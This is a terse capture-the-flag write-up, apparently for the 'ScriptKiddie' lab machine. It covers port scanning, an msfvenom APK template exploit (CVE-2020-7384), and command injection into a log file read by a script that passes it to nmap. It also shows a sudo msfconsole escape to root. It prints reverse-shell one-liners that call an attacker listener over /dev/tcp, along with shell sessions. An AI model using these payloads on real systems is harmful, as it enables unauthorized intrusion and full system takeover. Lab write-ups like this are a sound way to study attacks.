```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
some function on this page port 5000, 2nd is msfvenom, with vunl
https://github.com/CarsonShaffer/CVE-2020-7384/blob/main/CVE-2020-7384.sh

`└─$ nc -nvlp 4444`
```
listening on [any] 4444 ...
connect to [10.10.16.37] from (UNKNOWN) [10.129.95.150] 49588
bash: cannot set terminal process group (940): Inappropriate ioctl for device
bash: no job control in this shell
kid@scriptkiddie:~/html$ id
```
Port 500
> 3 apps running on it, nmap, msfvenom, searchsploit
> msfvenom has vunl- https://github.com/CarsonShaffer/CVE-2020-7384/blob/main/CVE-2020-7384.sh
> we create apk file with revershell, use it as input for msfvenom -x
> exeute it on the web app, get a shell of user

```
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.16.37] from (UNKNOWN) [10.129.95.150] 43862
bash: cannot set terminal process group (937): Inappropriate ioctl for device
bash: no job control in this shell
```

`kid@scriptkiddie:/home/pwn$ cat scanlosers.sh `
```
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi

```

in this script, read the content of logs.hackers, use the part after 2nd element as $ip to put behind nmap.
Let us put a reverse shell in to hackers

`echo 'x x $(bash -c "bash -i &>/dev/tcp/10.10.x.x/7777 0>&1")' > /home/kid/logs/hackers`
or 
`a b ;bash -c "bash -i &>/dev/tcp/10.10.16.37/8821 0>&1" #'
comment commands after payload

The script will run
`nmap $(bash -c "bash -i &>/dev/tcp/10.10.x.x/7777 0>&1")`
$() works as  command substitution, the output of $() will sent to nmap. but $() will be executed.

`└─$ nc -nvlp 8821`
```
listening on [any] 8821 ...
connect to [10.10.16.37] from (UNKNOWN) [10.129.95.150] 50582
bash: cannot set terminal process group (832): Inappropriate ioctl for device
bash: no job control in this shell

pwn@scriptkiddie:~$ sudo -l
sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```
From gtfobins
```
sudo msfconsole
msf6 > irb
>> system("/bin/sh")
```
```
>> 
>> system("/bin/bash")
id
uid=0(root) gid=0(root) groups=0(root)
cd /root/
```

#### Lesson learned
- for any input field has interactive function, check the function and version etc.
- nmap(any command) $(payload), may use to run as the privi of owner
